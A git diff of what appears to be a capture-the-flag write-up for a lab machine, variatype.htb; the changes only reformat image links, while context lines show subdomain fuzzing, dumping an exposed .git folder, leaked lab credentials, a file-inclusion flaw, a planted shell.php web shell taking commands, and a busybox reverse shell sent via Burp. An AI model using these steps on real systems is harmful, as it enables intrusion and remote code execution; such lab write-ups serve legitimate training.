@@ -24,11 +24,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Port 80
 
-![[Pasted image 20260403095614.png]]
+![Pasted image 20260403095614](../Attachments/Pasted%20image%2020260403095614.png)
 
 ## Ffuf
 - ffuf reveals a subdomain `portal.variatype.htb`
-![[Pasted image 20260403095844.png]]
+![Pasted image 20260403095844](../Attachments/Pasted%20image%2020260403095844.png)
 
 ```
 ffuf -u http://variatype.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.variatype.htb" -fw 5
@@ -60,10 +60,10 @@ portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duratio
 ```
 
 - Subdomain:
-![[Pasted image 20260403100046.png]]
+![Pasted image 20260403100046](../Attachments/Pasted%20image%2020260403100046.png)
 
 - If we click generate font we go to an intersting subdirectory:`/tools/variable-font-generator` this will be important later
-![[Pasted image 20260403115209.png]]
+![Pasted image 20260403115209](../Attachments/Pasted%20image%2020260403115209.png)
 - There is a git subdirectory. We can dump using `git-dumper`
 ```
 git-dumper http://portal.variatype.htb/.git git-repo
@@ -103,11 +103,11 @@ index b328305..615e621 100644
 
 ```
 - Using these credentials `gitbot`:`G1tB0t_Acc3ss_2025!` I can login to `portal.variatype.htb`
-![[Pasted image 20260403102233.png]]
+![Pasted image 20260403102233](../Attachments/Pasted%20image%2020260403102233.png)
 - gobuster reveals some subdirectories and `download.php` asks for a file parameter:
-![[Pasted image 20260403113906.png]]
+![Pasted image 20260403113906](../Attachments/Pasted%20image%2020260403113906.png)
 
-![[Pasted image 20260403113921.png]]
+![Pasted image 20260403113921](../Attachments/Pasted%20image%2020260403113921.png)
 
 - the parameter is `f` (lucky test):
 - There is an LFI vulnerability here:
@@ -188,7 +188,7 @@ curl -s -X POST "http://variatype.htb/tools/variable-font-generator/process" \
 - I can then access `shell.php` via the portal subdomain to pass commands:
 http://portal.variatype.htb/files/shell.php?cmd=id
 
-![[Pasted image 20260403104311.png]]
+![Pasted image 20260403104311](../Attachments/Pasted%20image%2020260403104311.png)
 
 - Using Burp I send a busybox epxloit to get a shell:
 ```
@@ -205,7 +205,7 @@ Priority: u=0, i
 ```
 - I grab  a shell:
 
-![[Pasted image 20260403105303.png]]
+![Pasted image 20260403105303](../Attachments/Pasted%20image%2020260403105303.png)
 
 Privilege Escalation to steve
 Step 7: Generate SSH Key for steve
